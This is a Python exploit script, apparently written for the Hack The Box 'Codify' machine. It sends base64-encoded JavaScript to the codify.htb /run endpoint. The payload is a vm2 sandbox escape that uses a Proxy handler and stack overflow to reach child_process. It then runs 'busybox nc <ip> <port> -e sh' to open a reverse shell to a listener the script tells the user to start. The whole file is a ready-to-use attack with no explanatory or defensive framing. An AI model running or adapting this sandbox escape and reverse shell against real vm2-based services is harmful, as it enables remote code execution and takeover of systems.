import requests
import ipaddress
import base64

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_port(port):
    try:
        port_num = int(port)
        return 0 < port_num <= 65535
    except ValueError:
        return False
        
def send_request(target_ip, target_port):
    url = 'http://codify.htb/run'
    headers = {
        'Host': 'codify.htb',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://codify.htb/editor',
        'Content-Type': 'application/json',
        'Origin': 'http://codify.htb',
        'Connection': 'close'
    }

    exploit_str = f"""
    const {{VM}} = require("vm2");
    const vm = new VM();

    const code = `
    err = {{}};
    const handler = {{
        getPrototypeOf(target) {{
            (function stack() {{
                new Error().stack;
                stack();
            }})();
        }}
    }};
    
    const proxiedErr = new Proxy(err, handler);
    try {{
        throw proxiedErr;
    }} catch ({{constructor: c}}) {{
        c.constructor('return process')().mainModule.require('child_process').execSync('busybox nc {target_ip} {target_port} -e sh');
    }}
    `;

    console.log(vm.run(code));
    """

    exploit_str = base64.b64encode(exploit_str.encode()).decode()
    
    json_payload = {"code": exploit_str}
    
    response = requests.post(url, json=json_payload, headers=headers)

if __name__ == "__main__":

    print("Please make sure you have opened a reverse shell and it is actively listening.")
    print("For example, you can use the following command:")
    print("sudo nc -nvlp 4444")
    target_ip = input("Enter the local IP: ")
    target_port = input("Enter the local port: ")

    if not is_valid_ip(target_ip):
        print("Local IP error!")
        exit()

    if not is_valid_port(target_port):
        print("Local port error!")
        exit()

    send_request(target_ip, target_port)
    
